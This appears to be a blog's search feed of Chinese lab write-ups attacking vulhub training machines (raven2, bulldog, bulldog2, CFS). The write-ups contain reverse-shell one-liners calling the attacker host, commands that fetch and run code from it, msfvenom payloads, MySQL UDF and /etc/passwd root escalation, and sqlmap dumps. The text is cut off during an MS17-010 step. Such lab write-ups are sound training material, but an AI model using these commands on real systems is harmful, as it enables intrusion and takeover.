<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【vulhub】raven2</title>
    <link href="/2023/10/10/raven2/"/>
    <url>/2023/10/10/raven2/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-环境搭建"><a class="header-anchor" href="#0x00-环境搭建">🍭</a>0x00 环境搭建</h3><p>攻击机（kali）：192.168.20.131</p><p>靶机（bulldog2）：192.168.20.138</p><p>靶机ip自动获取</p><h3 id="0x01-信息收集"><a class="header-anchor" href="#0x01-信息收集">🍭</a>0x01 信息收集</h3><p>主机发现</p><pre><code class="hljs angelscript">netdiscover -i eth0 -r <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span></code></pre><p><img src="/2023/10/10/raven2/1.png" alt="1"></p><p>端口扫描</p><pre><code class="hljs angelscript">masscan --rate=<span class="hljs-number">10000</span> -p0<span class="hljs-number">-65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.138</span></code></pre><p><img src="/2023/10/10/raven2/2.png" alt="2"></p><p>开放了111、22、50311、80端口</p><p>网站指纹信息</p><p><img src="/2023/10/10/raven2/3.png" alt="3"></p><p>目录扫描</p><p><img src="/2023/10/10/raven2/4.png" alt="4"></p><h3 id="0x02-信息利用"><a class="header-anchor" href="#0x02-信息利用">🍭</a>0x02 信息利用</h3><p>浏览目录扫描到的网站，发现第一个flag</p><p><img src="/2023/10/10/raven2/5.png" alt="5"></p><p>该目录下还有一个文件记录了服务还有对应的历史漏洞</p><p><img src="/2023/10/10/raven2/6.png" alt="6"></p><p>还发现了一个版本文件</p><p><img src="/2023/10/10/raven2/7.png" alt="7"></p><p>可推断网站使用PHPMailer服务且版本为5.2.16</p><h3 id="0x03-漏洞利用"><a class="header-anchor" href="#0x03-漏洞利用">🍭</a>0x03 漏洞利用</h3><p>看到服务先用kali工具搜索看有没有可利用脚本</p><p><img src="/2023/10/10/raven2/8.png" alt="8"></p><p><a href="http://xn--40974-2n7j53a82tepc073b7z8e.py">根据版本选择40974.py</a>，查看说明</p><pre><code class="hljs awk">searchsploit -x php<span class="hljs-regexp">/webapps/</span><span class="hljs-number">40974</span>.py</code></pre><p><img src="/2023/10/10/raven2/9.png" alt="9"></p><p>下载到当前目录下</p><p><img src="/2023/10/10/raven2/10.png" alt="10"></p><p>修改脚本内容</p><p><img src="/2023/10/10/raven2/11.png" alt="11"></p><p>执行脚本</p><p><img src="/2023/10/10/raven2/12.png" alt="12"></p><p>在kali上开启监听，对靶机的shell.php进行访问即可反弹shell</p><p><img src="/2023/10/10/raven2/13.png" alt="13"></p><p>和之前一样获取交互式终端</p><p><img src="/2023/10/10/raven2/14.png" alt="14"></p><p>找一下有没有flag</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -name <span class="hljs-string">&quot;flag*&quot;</span></code></pre><p><img src="/2023/10/10/raven2/15.png" alt="15"></p><h3 id="0x04-提权"><a class="header-anchor" href="#0x04-提权">🍭</a>0x04 提权</h3><p>先查看正在运行的进程有没有以root权限运行的服务</p><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -aux | <span class="hljs-keyword">grep</span> root</code></pre><p><img src="/2023/10/10/raven2/16.png" alt="16"></p><p>注意到mysql服务，联想到udf提权，去搜索一下有没有可利用脚本</p><p><img src="/2023/10/10/raven2/17.png" alt="17"></p><p>这里需要知道MySQL版本，去找看看有没有数据库密码，查找文件发现了wordpress目录下有网站配置文件，进行搜索passwd关键字：</p><p><img src="/2023/10/10/raven2/18.png" alt="18"></p><p>在第28行有关键词：</p><p><img src="/2023/10/10/raven2/19.png" alt="19"></p><p>进行数据库登录：</p><p><img src="/2023/10/10/raven2/20.png" alt="20"></p><p>udf提权先决条件：</p><ul><li><p>先获取mysql的权限（连接上了mysql数据库）</p></li><li><p>Mysql版本大于5.1，且知道plugin目录</p><p><img src="/2023/10/10/raven2/26.png" alt="26"></p></li><li><p>mysql有写入文件的权限，即secure_file_priv的值为空</p></li></ul><p><img src="/2023/10/10/raven2/25.png" alt="25"></p><p>条件都满足，可利用udf提权。根据数据库版本5.5.6选择1518.c，打开里面有说明</p><p><img src="/2023/10/10/raven2/21.png" alt="21"></p><p>按照说明执行，先将 <code>1518.c</code> 进行编译，生成共享库 <code>1518.so</code></p><pre><code class="hljs angelscript">gcc -g -c <span class="hljs-number">1518.</span>cgcc -g -<span class="hljs-keyword">shared</span> -Wl,-soname,<span class="hljs-number">1518.</span>so -o <span class="hljs-number">1518.</span>so <span class="hljs-number">1518.</span>o -lc</code></pre><p>在kali上开启服务，<a href="http://xn--1518-z94fg344nmk4apz9ebxq.so">在靶机上下载1518.so</a></p><pre><code class="hljs awk">python -m SimpleHTTPServer <span class="hljs-number">8000</span>  <span class="hljs-comment"># 在kali中开启服务</span>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.131</span>:<span class="hljs-number">8000</span>/<span class="hljs-number">1518</span>.so  <span class="hljs-comment">#下载文件</span></code></pre><p><img src="/2023/10/10/raven2/22.png" alt="22"></p><p>登录mysql进行操作</p><pre><code class="hljs pgsql">* mysql&gt; use mysql;* mysql&gt; <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(<span class="hljs-type">line</span> blob);    #创建数据表 foo,字段blob,linestring类型* mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(load_file(<span class="hljs-string">&#x27;/var/www/html/1518.so&#x27;</span>));* mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;   #因为mysql版本&gt;=<span class="hljs-number">5.1</span>，所以必须把 UDF 的动态链接库.so文件放置于 MySQL 安装目录下的 lib/mysql/plugin 文件夹下文件夹下才能创建自定义函数。* mysql&gt; <span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;  #//新建存储do_system函数,引用<span class="hljs-number">1518.</span>so文件* mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;* mysql&gt; <span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);   #调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令</code></pre><p><img src="/2023/10/10/raven2/23.png" alt="23"></p><p>执行find命令提权，拿到flag</p><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -exec &#x27;/</span>bin/sh<span class="hljs-string">&#x27; \;</span></code></pre><p><img src="/2023/10/10/raven2/24.png" alt="24"></p><p>4个flag都被找到啦。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【vulhub】bulldog2</title>
    <link href="/2023/09/30/bul2/"/>
    <url>/2023/09/30/bul2/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-环境搭建"><a class="header-anchor" href="#0x00-环境搭建">🍭</a>0x00 环境搭建</h3><p>攻击机（kali）：192.168.20.131</p><p>靶机（bulldog2）：192.168.20.137</p><p>靶机IP设置：在启动界面按E进入代码行然后找到ro这一行将其改为rw 并在后面接上 init=/bin/bash，然后按ctrl+x保存重启，输入passwd  root修改密码</p><p><img src="/2023/09/30/bul2/2.png" alt="2"></p><p>重启后root账户登录后输入dhclient配置ip即可</p><p><img src="/2023/09/30/bul2/1.png" alt="1"></p><h3 id="0x01-信息收集"><a class="header-anchor" href="#0x01-信息收集">🍭</a>0x01 信息收集</h3><p>主机发现</p><pre><code class="hljs angelscript">netdiscover -i eth0 -r <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span></code></pre><p><img src="/2023/09/30/bul2/3.png" alt="3"></p><p>端口扫描</p><pre><code class="hljs angelscript">masscan --rate=<span class="hljs-number">10000</span> -p0<span class="hljs-number">-65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.137</span></code></pre><p><img src="/2023/09/30/bul2/4.png" alt="4"></p><p>网站指纹信息扫描</p><p><img src="/2023/09/30/bul2/5.png" alt="5"></p><p>目录扫描没发现有用的信息。</p><h3 id="0x02-信息利用"><a class="header-anchor" href="#0x02-信息利用">🍭</a>0x02 信息利用</h3><p>80端口开放，进行访问</p><p><img src="/2023/09/30/bul2/6.png" alt="6"></p><p>有登录、注册功能，但注册功能无法使用，如果没有发现什么可利用的目录，就可以尝试查看js页面，一般会有突破口，在register页面发现四个js文件进行审查：</p><p><img src="/2023/09/30/bul2/7.png" alt="7"></p><p>发现注册需要四个信息：name,email,username,password,现在我们可以抓登录页面的包进行注册：</p><p><img src="/2023/09/30/bul2/8.png" alt="8"></p><p>将两处字段进行修改：</p><p><img src="/2023/09/30/bul2/9.png" alt="9"></p><p>注册成功，多创建一个账号（aaa）进行测试，先登录111用户</p><p><img src="/2023/09/30/bul2/10.png" alt="10"></p><p>直接在url修改用户名就登录aaa用户</p><p><img src="/2023/09/30/bul2/11.png" alt="11"></p><p>此处存在水平越权。抓一个登录成功的包</p><p><img src="/2023/09/30/bul2/12.png" alt="12"></p><p>发现JWT字段直接进行解密</p><p><img src="/2023/09/30/bul2/13.png" alt="13"></p><p>出现陌生字段，在js进行查找</p><p><img src="/2023/09/30/bul2/14.png" alt="14"></p><p>发现<code>master_admin_user</code>值，重新抓包</p><p><img src="/2023/09/30/bul2/24.png" alt="24"></p><p>forward即可出现JWT字段，将&quot;auth_level&quot;字段值修改成<code>master_admin_user</code>(明文与编码都修改)<br><img src="/2023/09/30/bul2/15.png" alt="15"></p><p>forward发现进入管理员界面，此处存在垂直越权。</p><p><img src="/2023/09/30/bul2/16.png" alt="16"></p><p>点击管理员进行登录抓包发现密码错误时状态码为200</p><p><img src="/2023/09/30/bul2/17.png" alt="17"></p><p>有点可疑，依次对用户名密码进行测试，发现在密码后加上<code>&quot;</code>会报错</p><p><img src="/2023/09/30/bul2/25.png" alt="25"></p><p>报出一个路径，将其进行搜索</p><p><img src="/2023/09/30/bul2/26.png" alt="26"></p><p>在GitHub找到源码，对源码进行审计，发现命令执行函数</p><p><img src="/2023/09/30/bul2/27.png" alt="27"></p><p>可尝试反弹shell</p><h3 id="0x03-漏洞利用"><a class="header-anchor" href="#0x03-漏洞利用">🍭</a>0x03 漏洞利用</h3><p>在修改密码处反弹shell</p><pre><code class="hljs gradle">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span>.<span class="hljs-number">20.131</span> <span class="hljs-number">1111</span> &gt;<span class="hljs-regexp">/tmp/</span>f#mkfifo：首先创建了一个管道<span class="hljs-regexp">/tmp/</span>f#cat：将管道里面的内容输出传递给<span class="hljs-regexp">/bin/</span>sh#<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc .... &gt; <span class="hljs-regexp">/tmp/</span>f：sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</code></pre><p><img src="/2023/09/30/bul2/18.png" alt="18"></p><p>拿到shell</p><p><img src="/2023/09/30/bul2/19.png" alt="19"></p><h3 id="0x04-提权"><a class="header-anchor" href="#0x04-提权">🍭</a>0x04 提权</h3><p>和之前一样先将简单的Shell转换成为完全交互式的终端</p><pre><code class="hljs swift">python -<span class="hljs-built_in">c</span> &#x27;<span class="hljs-keyword">import</span> pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><p>查看用户信息</p><p><img src="/2023/09/30/bul2/20.png" alt="20"></p><p>可以创建具有root权限的新用户</p><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt hack hack<span class="hljs-number">123</span><span class="hljs-attribute">echo</span> &#x27;hack:$<span class="hljs-number">1</span>$hack$WTn<span class="hljs-number">0</span>dk<span class="hljs-number">2</span>QjNeKfl.DHOUue<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</code></pre><p>也可以使用perl</p><pre><code class="hljs awk">perl -le <span class="hljs-string">&#x27;print crypt(&quot;pass&quot;,&quot;aa&quot;)&#x27;</span>      <span class="hljs-regexp">//</span>pass为密码，aa为加密盐echo <span class="hljs-string">&#x27;kkk:aaW3cJZ7OSoQM:0:0:kkk:/root:/bin/bash&#x27;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>passwd    <span class="hljs-regexp">//</span>将其写入passwd文件</code></pre><p><img src="/2023/09/30/bul2/21.png" alt="21"></p><p><img src="/2023/09/30/bul2/22.png" alt="22"></p><p>添加成功</p><p><img src="/2023/09/30/bul2/23.png" alt="23"></p><h3 id="0x05-总结"><a class="header-anchor" href="#0x05-总结">🍭</a>0x05 总结</h3><p>​整个流程中水平越权、垂直越权比较好发现，比较难想到的点在管理员登录界面里，通过给密码赋错误值引起报错从而找到GitHub上源码，进而找到命令执行点。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【vulhub】bulldog</title>
    <link href="/2023/09/21/bull/"/>
    <url>/2023/09/21/bull/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-靶机环境"><a class="header-anchor" href="#0x00-靶机环境">🍭</a>0x00 靶机环境</h3><ul><li>靶机：bulldog靶机(192.168.20.136)</li><li>攻击机：kali Linux(192.168.20.131)</li></ul><p>打开bulldog发现只有本地网卡</p><p><img src="/2023/09/21/bull/2.png" alt="2"></p><p>需要设置虚拟网络，输入“mount -o rw,remount / ”命令，使 / 路径文件系统的可读模式能自由修改。接着查看网卡名称：</p><p><img src="/2023/09/21/bull/5.png" alt="5"></p><p>这里使用的是ens33，接下来修改网络配置文件：</p><ul><li>vi /etc/network/interfaces<br><img src="/2023/09/21/bull/7.png" alt="7"></li></ul><p>配置后重启即可。</p><h3 id="0x01-信息收集"><a class="header-anchor" href="#0x01-信息收集">🍭</a>0x01 信息收集</h3><p>网段扫描，发现主机</p><p><img src="/2023/09/21/bull/1.png" alt="1"></p><p>发现靶机开放了三个端口，对80端口进行访问</p><p><img src="/2023/09/21/bull/3.png" alt="3"></p><p>未发现有用信息，进一步收集信息</p><h3 id="0x02-漏洞探测"><a class="header-anchor" href="#0x02-漏洞探测">🍭</a>0x02 漏洞探测</h3><h5 id="网站指纹信息扫描"><a class="header-anchor" href="#网站指纹信息扫描">🍭</a>网站指纹信息扫描</h5><pre><code class="hljs awk">whatweb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.136</span>    <span class="hljs-comment">#Web指纹扫描用于识别目标所运行的web软件、后端服务器、编程语言等特征，实现对目标的web应用的准确标识。</span></code></pre><p><img src="/2023/09/21/bull/4.png" alt="4"></p><h5 id="目录扫描"><a class="header-anchor" href="#目录扫描">🍭</a>目录扫描</h5><p><img src="/2023/09/21/bull/6.png" alt="6"></p><h3 id="0x03-信息利用"><a class="header-anchor" href="#0x03-信息利用">🍭</a>0x03 信息利用</h3><p>尝试访问扫描到的目录：</p><p><img src="/2023/09/21/bull/8.png" alt="8"></p><p>发现登录框，尝试sql注入、弱口令无果，转去访问其它目录</p><p><img src="/2023/09/21/bull/9.png" alt="9"></p><p>webshell连接进去显示未认证，查看源码发现hash</p><p><img src="/2023/09/21/bull/10.png" alt="10"></p><p>进行解密</p><p><img src="/2023/09/21/bull/11.png" alt="11"></p><p>使用nick:bulldog进行登录</p><p><img src="/2023/09/21/bull/12.png" alt="12"></p><p>登陆成功，此时可以访问webshell</p><p><img src="/2023/09/21/bull/13.png" alt="13"></p><p>测试一下，做了过滤，只能执行展示的六个命令</p><p><img src="/2023/09/21/bull/14.png" alt="14"></p><p>但可以使用管道符绕过</p><p><img src="/2023/09/21/bull/15.png" alt="15"></p><h3 id="0x04-漏洞利用"><a class="header-anchor" href="#0x04-漏洞利用">🍭</a>0x04  漏洞利用</h3><p>此处想要反弹shell有两种思路，一是使用echo命令直接反弹，二是在服务器部署脚本下载并执行。</p><h5 id="法一-echo命令反弹"><a class="header-anchor" href="#法一-echo命令反弹">🍭</a>法一 echo命令反弹</h5><p>kali开启监听</p><pre><code class="hljs angelscript">nc -lvp <span class="hljs-number">1111</span></code></pre><p>shell执行命令</p><pre><code class="hljs lsl">echo &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.131</span>/<span class="hljs-number">1111</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27; | bash</code></pre><h5 id="法二-python脚本反弹"><a class="header-anchor" href="#法二-python脚本反弹">🍭</a>法二 python脚本反弹</h5><p>在服务器上部署脚本</p><p><img src="/2023/09/21/bull/23.png" alt="23"></p><p>服务器开启web服务</p><pre><code class="hljs angelscript">python -m SimpleHTTPServer <span class="hljs-number">80</span></code></pre><p>shell执行命令</p><pre><code class="hljs awk">pwd|wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.131</span>/getshell.py</code></pre><p>脚本下载成功</p><p><img src="/2023/09/21/bull/24.png" alt="24"></p><p>kali开启监听，shell执行脚本</p><pre><code class="hljs vim">ifconfig|<span class="hljs-keyword">python</span> getshell.<span class="hljs-keyword">py</span></code></pre><p>反弹成功</p><p><img src="/2023/09/21/bull/16.png" alt="16"></p><h3 id="0x05-提权"><a class="header-anchor" href="#0x05-提权">🍭</a>0x05 提权</h3><p>cat /etc/passwd 查看用户名：</p><p><img src="/2023/09/21/bull/17.png" alt="17"></p><p>找到一个带admin的用户，切换到该目录下，查看目录下隐藏文件</p><p><img src="/2023/09/21/bull/18.png" alt="18"></p><p>发现直接读取为乱码</p><p><img src="/2023/09/21/bull/19.png" alt="19"></p><p>使用strings命令（用来提取和显示非文本文件中的文本字符串）</p><p><img src="/2023/09/21/bull/20.png" alt="20"></p><p>发现可以字符，将其拼接，猜测密码为SUPERultimatePASSWORDyouCANTget，文件中还提示了提权命令</p><p><img src="/2023/09/21/bull/21.png" alt="21"></p><p>提示当前非终端，可以用Python调用本地的shell生成交互式终端：</p><pre><code class="hljs swift">python -<span class="hljs-built_in">c</span> &#x27;<span class="hljs-keyword">import</span> pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><p><img src="/2023/09/21/bull/22.png" alt="22"></p><p>获取flag。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【VulHub靶场】之CFS三层靶机内网渗透</title>
    <link href="/2023/09/19/cfs/"/>
    <url>/2023/09/19/cfs/</url>
    
    <content type="html"><![CDATA[<h1>【VulHub靶场】之CFS三层靶机内网渗透</h1><h3 id="一、环境搭建"><a class="header-anchor" href="#一、环境搭建">🍭</a>一、环境搭建</h3><p>靶场环境：</p><p><img src="/2023/09/19/cfs/2.png" alt="2"></p><p>将靶场下载到本地，先进入VM配置网卡，搭建好一个内网环境，再将三台虚拟机导入vm。</p><p>这里我们配置3张网卡，如下：</p><p><img src="/2023/09/19/cfs/1.png" alt="1"></p><p>然后把对应的网卡添加到虚拟机上：</p><img src="/2023/09/19/cfs/3.png" alt="3"><img src="/2023/09/19/cfs/4.png" alt="4"><img src="/2023/09/19/cfs/5.png" alt="5"><p>配置宝塔环境：</p><p>target1：宝塔地址：<a href="http://192.168.20.135:8888/">http://192.168.20.135:8888/</a> 账号：eaj3yhsl密码：41bb8fee<img src="/2023/09/19/cfs/6.png" alt="6" style="zoom: 50%;"></p><p>将centos靶机中c段为20的那个ip添加进去，打开目标的80端口，确保能够访问到对应的web页面：</p><p><img src="/2023/09/19/cfs/7.png" alt="7"></p><p>ubuntu同理进行配置，至此环境搭建完成，目前信息如下：</p><img src="/2023/09/19/cfs/8.png" alt="8" style="zoom:67%;"><h3 id="二、渗透实操"><a class="header-anchor" href="#二、渗透实操">🍭</a>二、渗透实操</h3><p>思路：kali和centos的第一张网卡位于外网，即攻击者拥有一台kali，ubuntu、win7无法连接外网，所以只能先打下centos，然后作为跳板攻击ubuntu，win7，即现在要对一个ip为192.168.20.135的外网主机进行渗透。</p><h4 id="target1：centos"><a class="header-anchor" href="#target1：centos">🍭</a>target1：centos</h4><p>先进行信息收集：nmap扫描探测端口开启了什么服务</p><img src="/2023/09/19/cfs/9.png" alt="9" style="zoom:67%;"><p>80端口开放，访问80端口：</p><img src="/2023/09/19/cfs/10.png" alt="10" style="zoom:50%;"><p>打开后发现它是 ThinkPHP 框架V5.0，它存在一个 RCE，直接用工具检测</p><p><img src="/2023/09/19/cfs/11.png" alt="11"></p><p>测试一下</p><p><img src="/2023/09/19/cfs/12.png" alt="12"></p><p>蚁剑getshell</p><p><img src="/2023/09/19/cfs/13.png" alt="13"></p><p>利用蚁剑的终端做进一步信息收集，发现了另一个ip</p><img src="/2023/09/19/cfs/14.png" alt="14" style="zoom:67%;"><p>这就说明了它还存在其他内网主机，接下来需要利用msf创建一个后门。</p><p>在桌面创建一个elf格式的木马，</p><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">86</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.x LPORT=<span class="hljs-number">4444</span> -f elf &gt; <span class="hljs-number">4444</span>.elf</code></pre><p><img src="/2023/09/19/cfs/15.png" alt="15"></p><p>通过刚才蚁剑上传上去，</p><p><img src="/2023/09/19/cfs/16.png" alt="16"></p><p>最后给 4444.elf 一个可执行权限并运行成功上线：</p><pre><code class="hljs angelscript">chmod +x <span class="hljs-number">4444.</span>elf./<span class="hljs-number">4444.</span>elf</code></pre><p>执行</p><p><img src="/2023/09/19/cfs/17.png" alt="17"></p><p>kali开监控，执行木马</p><pre><code class="hljs routeros">msfconsoleuse exploit/multi/handler<span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="hljs-builtin-name">set</span> LHOST 192.168.20.131<span class="hljs-builtin-name">set</span> LPORT 4444exploit</code></pre><p>执行</p><img src="/2023/09/19/cfs/18.png" alt="18" style="zoom:67%;"><p>但这里一直不成功，上网查阅资料发现，我前面生成木马的语句是适用msf5的，但我的版本是msf6</p><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.x LPORT=<span class="hljs-number">4444</span> -f elf &gt; <span class="hljs-number">4444</span>.elf  //msf<span class="hljs-number">5</span>写法<span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp LHOST=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.x LPORT=<span class="hljs-number">4444</span> -f elf &gt; <span class="hljs-number">4444</span>.elf  //msf<span class="hljs-number">6</span>写法</code></pre><p>重新生成木马后成功getshell</p><p><img src="/2023/09/19/cfs/19.png" alt="19"></p><p>这里彻底地拿到了centos的权限，接下来进行探测打内网其他的主机</p><h4 id="target2：ubuntu"><a class="header-anchor" href="#target2：ubuntu">🍭</a>target2：ubuntu</h4><p>先进行信息收集，但发现nmap扫不到，因为我们的网段设置，这里扫描是用的kali的ip扫描，<strong>模拟的环境中kali和centos是公网主机，所以可以直接扫到，而现在扫的ubuntu属于内网网段</strong>是扫不到的。此时可以利用刚才打下的centos，centos虽然是公网主机，但是它也在内网里，所以我们就用centos的ip来打它的内网。</p><p>先用msf自带的探测网络接口的模块进一步进行信息探测</p><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="bash"> get_local_subnets</span></code></pre><p><img src="/2023/09/19/cfs/20.png" alt="20"></p><p>centos处于2个网段内，我们需要来添加一个路由**(autoroute -s)**，因为kali已经在20的网段内，所以添加的路由肯定添加22网段的，相当于我们建立了一个攻击机kali和22网段的隧道：</p><pre><code class="hljs angelscript">run <span class="hljs-built_in">auto</span>route -s <span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>run <span class="hljs-built_in">auto</span>route -p</code></pre><p><img src="/2023/09/19/cfs/21.png" alt="21"></p><p>现在实现了centos上的shell到22网段，现在要想用kali到达22网段，就要上代理,使用msf模块存在代理功能</p><pre><code class="hljs angelscript">background use auxiliary/server/socks_proxy<span class="hljs-keyword">set</span> SRVHOST <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-keyword">set</span> SRVPORT <span class="hljs-number">1080</span>exploit</code></pre><p>执行</p><p><img src="/2023/09/19/cfs/22.png" alt="22"></p><p>设置本地代理接口访问：</p><pre><code class="hljs angelscript">vim /etc/proxychains4.confsocks5 <span class="hljs-number">192.168</span><span class="hljs-number">.20</span><span class="hljs-number">.131</span> <span class="hljs-number">1080</span></code></pre><p>进行添加</p><p><img src="/2023/09/19/cfs/23.png" alt="23"></p><p>此时在指令前输入proxychains4即可走代理来执行命令，探测一下Ubuntu端口</p><pre><code class="hljs angelscript">proxychains4 nmap -sT -Pn <span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span></code></pre><p><img src="/2023/09/19/cfs/24.png" alt="24"></p><p>80端口开放，进行访问，浏览器访问需要将浏览器代理设置为192.168.20.131:1080</p><img src="/2023/09/19/cfs/25.png" alt="25" style="zoom:50%;"><p>进行访问：</p><p><img src="/2023/09/19/cfs/26.png" alt="26"></p><p>查看源码</p><p><img src="/2023/09/19/cfs/27.png" alt="27"></p><p>提示了SQL注入点，sqlmap跑一下</p><pre><code class="hljs awk">proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span>  --dbs   <span class="hljs-regexp">//</span>爆库proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span>  -D bagecms --tables <span class="hljs-regexp">//</span>爆表proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D begacms -T bage_admin --columns  <span class="hljs-regexp">//</span>爆列proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D bagecms -T bage_admin -C username,password –dump  <span class="hljs-regexp">//</span>爆值</code></pre><p>爆库：</p><p><img src="/2023/09/19/cfs/28.png" alt="28"></p><p>爆表：<img src="/2023/09/19/cfs/29.png" alt="29"></p><p>爆值：<img src="/2023/09/19/cfs/30.png" alt="30"></p><p>爆出了账号密码，进行登录。用kali的目录扫描寻找登录页面</p><p><img src="/2023/09/19/cfs/50.png" alt="50"></p><p>找到了robots.txt</p><p><img src="/2023/09/19/cfs/51.png" alt="51"></p><p>访问得到登录页面：</p><p><img src="/2023/09/19/cfs/45.png" alt="45"></p><p>进行登录</p><p><img src="/2023/09/19/cfs/32.png" alt="32"></p><p>成功登录</p><p><img src="/2023/09/19/cfs/33.png" alt="33"></p><p>浏览了网页发现，在模板处可以写入文件，我们在此写入一句话木马</p><p><img src="/2023/09/19/cfs/34.png" alt="34"></p><p>蚁剑连接时要配上和kali一样的代理，</p><p><img src="/2023/09/19/cfs/35.png" alt="35"></p><p>连接</p><img src="/2023/09/19/cfs/49.png" alt="49" style="zoom:50%;"><p><img src="/2023/09/19/cfs/36.png" alt="36"></p><p>拿到webshell权限，同理，要进一步拿到主机权限。我们一样生成针对ubuntu的木马，但是<strong>木马的shell只能用正向</strong>，因为我们是搭建隧道来访问的ubuntu，正常访问是访问不到的，且它处于内网中也访问不到我们，所以我们需要通过隧道去找他。</p><p>生成木马：</p><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">64</span>/meterpreter/bind_tcp LPORT=<span class="hljs-number">3333</span> -f elf &gt; <span class="hljs-number">2</span>.elf</code></pre><p><img src="/2023/09/19/cfs/37.png" alt="37"></p><p>上传，开启监听</p><pre><code class="hljs routeros">use exploit/multi/handler<span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/bind_tcp<span class="hljs-builtin-name">set</span> rhost 192.168.22.129<span class="hljs-builtin-name">set</span> LPORT 3333run</code></pre><p><img src="/2023/09/19/cfs/38.png" alt="38"></p><p>成功拿下</p><h4 id="target3：win7"><a class="header-anchor" href="#target3：win7">🍭</a>target3：win7</h4><p>接下来跟之前差不多，获取网络接口，添加路由</p><pre><code class="hljs angelscript">run get_local_subnetsrun <span class="hljs-built_in">auto</span>route -s <span class="hljs-number">192.168</span><span class="hljs-number">.33</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span></code></pre><p><img src="/2023/09/19/cfs/39.png" alt="39"></p><p><img src="/2023/09/19/cfs/40.png" alt="40"></p><p>对33网段进行扫描</p><pre><code class="hljs angelscript">proxychains4 nmap -sT -Pn <span class="hljs-number">192.168</span><span class="hljs-number">.33</span><span class="hljs-number">.33</span></code></pre><p><img src="/2023/09/19/cfs/41.png" alt="41"></p><p><img src="/2023/09/19/cfs/42.png" alt="42"></p><p>发现445端口，直接用永恒之蓝</p><pre><code class="hljs angelscript">search ms17<span class="hljs-number">-010</span>use <span class="hljs-number">1</span><span class="hljs-keyword">set</span> payload 